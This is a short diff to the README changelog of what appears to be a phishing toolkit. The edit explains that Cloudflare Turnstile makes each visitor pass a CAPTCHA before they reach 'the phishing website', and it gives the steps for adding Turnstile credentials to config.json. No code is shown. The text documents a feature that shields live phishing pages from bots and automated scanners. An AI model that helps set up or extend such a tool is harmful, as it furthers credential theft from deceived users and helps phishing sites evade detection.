@@ -15,11 +15,13 @@ Integrated **[Cloudflare STUN/TURN](https://developers.cloudflare.com/calls/turn
   
 
 #### 2. **Cloudflare Turnstile (CAPTCHA)**
-Added **Turnstile** to block bots and ensure human users. Can be enabled in `config.json`.
+Added **Turnstile** to block bots and ensure human users. Can be enabled in `config.json`. Upon a user’s first visit, they are redirected to complete a CAPTCHA, and only after successful completion will they gain access to the phishing website.
 
 **How to Get `Cloudflare Turnstile` Credentials:**
 - Go to **Cloudflare Dashboard → Turnstile → Add Widget → Choose Domain** (keep everything else as default)
 - Add the credentials to `config.json`.
+![turnstile-page](https://github.com/user-attachments/assets/a9a94249-60f6-4abb-94a3-c4450df3b670)
+
 
 #### 3. **Updated `config.json`**
 
